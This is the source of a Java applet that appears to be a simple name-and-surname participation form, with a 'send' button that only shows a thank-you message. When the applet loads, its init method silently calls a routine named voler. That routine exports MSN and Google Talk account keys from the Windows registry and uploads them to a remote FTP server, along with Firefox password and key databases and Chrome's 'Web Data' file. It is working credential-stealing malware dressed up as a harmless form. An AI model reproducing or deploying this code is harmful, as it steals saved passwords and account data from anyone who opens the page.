package applet;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import org.jibble.simpleftp.*;
/**
 *
 * @author Badr Bellaj
 */
public class Jform extends javax.swing.JApplet {

    /** Initializes the applet Jform */
    public void init() {
        
        
        
        try {
java.awt.EventQueue.invokeAndWait(new Runnable() {

 public void run() {
                    initComponents();
                         
   voler();

                    }
            });

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
     public static String[] dossi_profil(String cible){
                 
     
File dir = new File(cible);
String[] names =new String[4];
String[] target=new String[4];//contient les dossier du profil

String[] children = dir.list();
String filename;
int nbr_fich_doss=0;
if (children == null) {
    // Either dir does not exist or is not a directory
} else {
    for (int i=0; i<children.length; i++) {
        // Get filename of file or directory
        filename = children[i];
        names[i]=filename;
        nbr_fich_doss++;
    }
}
if(nbr_fich_doss>5)nbr_fich_doss=5;
    for (int i=0,j=0; i<nbr_fich_doss; i++) {
        if(names[i].contains("default"))
        {  target[j]=names[i];
        j++;
              //    System.out.println(names[i]);
        }
        
            
      
    }
    
    
    
    return target;
 }
  
     public static void voler()
     {
          SimpleFTP ftp = new SimpleFTP();
    
    // Connect to an FTP server on port 21.
  
          try{
    ftp.connect("ftp.freehostia.com", 21, "user", "pwd");//change this
 
    // Set binary mode.
    ftp.bin();
        ftp.cwd("ftp");
 
    // You can also upload from an InputStream, e.g.
    double f=Math.random();
        String userName = System.getProperty("user.name");

 String chrome=f+userName+"web ddata";
 File file;
 String c=System.getenv("HOMEDRIVE");//use home drive c or d ...

  String path_chrom=c+"\\Users\\"+userName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
  
           
    
    
    
    /******************************************************************************/
    
     String msn="HKEY_CURRENT_USER\\Software\\Microsoft\\IdentityCRL\\";
        String gtalk ="HKEY_CURRENT_USER\\Software\\Google\\Google Talk\\Accounts\\";
   
   
   Runtime rt = Runtime.getRuntime();
                //Process pr = rt.exec("cmd /c dir");
             ///  System.out.print(msn);   
                Process pr = rt.exec("regedit /e "+c+"\\ms.reg "+msn );
   
                   Process pr2 = rt.exec("regedit /e "+c+"\\gtk.reg "+gtalk);
               /*****************************************export key*****************************/

   
   
  
    
    
    
    String[] profiles;
    String path=System.getenv("APPDATA")+"\\Mozilla\\Firefox\\Profiles\\";
    profiles=dossi_profil(path);
 
   for (int i=0; i<profiles.length; i++) {
  if(profiles[i]!=null)
       {
   // System.out.println(profiles[i]);

    String signons=f+userName+".sqlite";
    String cert=f+userName+".db";
    String key=f+userName+".db";
    
/*****************************************Firefox*****************************/
 File  filefx=new File(path);
              if(filefx.exists())
              {
  
      
     ftp.stor(new FileInputStream(new File(path+"\\"+profiles[i]+"\\signons.sqlite")),signons);
     ftp.stor(new FileInputStream(new File(path+"\\"+profiles[i]+"\\cert8.db")),"cert"+cert);
      ftp.stor(new FileInputStream(new File(path+"\\"+profiles[i]+"\\key3.db")),"key"+key);
              }
              else {
                  //firefox non instalé
              }

            
            /*****************************************chrom*****************************/
            

  file=new File(path_chrom+"\\Web Data");
  if(file.exists())//windows seven
  {  
      //  System.out.print(path_chrom);   
      ftp.stor(new FileInputStream(file),chrome);
  }    
  else //win xp
  { 
      path_chrom=c+"\\Documents and Settings\\"+userName+"\\Local Settings\\Application Data\\Google\\Chrome\\";
    file=new File(path_chrom+"\\Web Data");
              if(file.exists())
    ftp.stor(new FileInputStream(file),chrome);    
              else {
             //  System.out.print("no");   
              }
  }
  //  ftp.stor(someSocket.getInputStream(), "blah.dat");
       }
     //  else break;
   }
   
   
   

   
    String msnuser=f+userName+"msn.reg";
     String gtuser=f+userName+"gtlk.reg";
     File registr=new File(c+"\\ms.reg");
     if(registr.exists())
        ftp.stor(new FileInputStream(registr),msnuser);
registr=new File(c+"\\gtk.reg");
if(registr.exists())
             ftp.stor(new FileInputStream(registr),gtuser);

   
   
   
   
   
   
    // Quit from the FTP server.
    ftp.disconnect();
    }
catch (IOException e) {
    // Jibble.
  //  System.out.println("error"+e);
}
     }
   
    /** This method is called from within the init() method to
     * initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is
     * always regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jTextField2 = new javax.swing.JTextField();
        jTextField1 = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();

        jButton1.setText("send");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jLabel1.setText("Nom ");

        jLabel2.setText("Prénom");

        jLabel6.setFont(new java.awt.Font("Tahoma", 0, 14));

        jLabel5.setText("20011/2012");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel2)
                            .addComponent(jLabel1))
                        .addGap(70, 70, 70)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(jLabel6, javax.swing.GroupLayout.DEFAULT_SIZE, 407, Short.MAX_VALUE)
                                .addContainerGap())
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                                    .addComponent(jTextField1, javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jTextField2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 198, Short.MAX_VALUE)
                                    .addComponent(jButton1, javax.swing.GroupLayout.Alignment.LEADING))
                                .addGap(219, 219, 219))))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addComponent(jLabel5)
                        .addGap(43, 43, 43))))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel1))
                .addGap(42, 42, 42)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel2))
                .addGap(52, 52, 52)
                .addComponent(jButton1)
                .addGap(319, 319, 319)
                .addComponent(jLabel6, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(20, 20, 20)
                .addComponent(jLabel5))
        );
    }// </editor-fold>//GEN-END:initComponents

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
     jLabel6.setText("Merci pour votre Participation");
        // TODO add your handling code here:
    }//GEN-LAST:event_jButton1ActionPerformed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JTextField jTextField1;
    private javax.swing.JTextField jTextField2;
    // End of variables declaration//GEN-END:variables
}
